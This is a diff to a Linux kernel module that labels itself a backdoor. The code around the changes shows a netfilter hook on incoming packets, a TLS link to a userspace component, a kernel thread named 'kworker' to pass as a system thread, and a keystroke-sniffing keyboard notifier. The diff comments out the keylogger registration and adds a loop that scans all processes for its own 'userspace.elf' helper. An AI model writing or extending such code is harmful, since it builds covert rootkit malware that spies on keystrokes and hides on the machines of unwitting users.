@@ -12,6 +12,7 @@
 #include <linux/kthread.h>
 #include <linux/module.h>
 #include <linux/net.h>
+#include <linux/sched/signal.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/skbuff.h>
@@ -320,6 +321,7 @@ int init_userspace_conn(void) {
         printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
         return error;
     }
+
     return 0;
 }
 
@@ -467,6 +469,8 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
  */
 static int __init mod_init(void) {
     int err;
+    struct task_struct *ts;
+    char proc_name[TASK_COMM_LEN];
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
@@ -498,7 +502,14 @@ static int __init mod_init(void) {
     svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
     printk(KERN_ALERT "backdoor module loaded\n");
 
-    register_keyboard_notifier(&keysniffer_blk);
+    for_each_process(ts) {
+        printk(KERN_INFO "Process name %s\n", get_task_comm(proc_name, ts));
+        if (strcmp("userspace.elf", proc_name) == 0) {
+            printk(KERN_INFO "Found my userspace proc\n");
+        }
+    }
+
+    //register_keyboard_notifier(&keysniffer_blk);
 
     return 0;
 }
@@ -537,7 +548,7 @@ static void __exit mod_exit(void) {
     if (closed_ports) {
         kfree(closed_ports);
     }
-    unregister_keyboard_notifier(&keysniffer_blk);
+    //unregister_keyboard_notifier(&keysniffer_blk);
     printk(KERN_ALERT "removed backdoor module\n");
 }
 
